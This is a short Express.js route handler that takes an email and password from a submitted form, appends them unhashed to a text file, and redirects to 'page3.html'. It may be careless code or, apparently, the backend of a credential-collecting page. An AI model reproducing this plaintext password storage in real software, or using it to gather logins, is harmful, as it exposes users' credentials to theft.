

const fs = require('fs');

app.post('/submit-form', (req, res) => {
  const { email, password } = req.body;

  // Save the data to a file
  const userData = `Email: ${email}, Password: ${password}\n`;
  fs.appendFileSync('users.txt', userData);

  // Redirect to page3.html
  res.redirect('/page3.html');
});
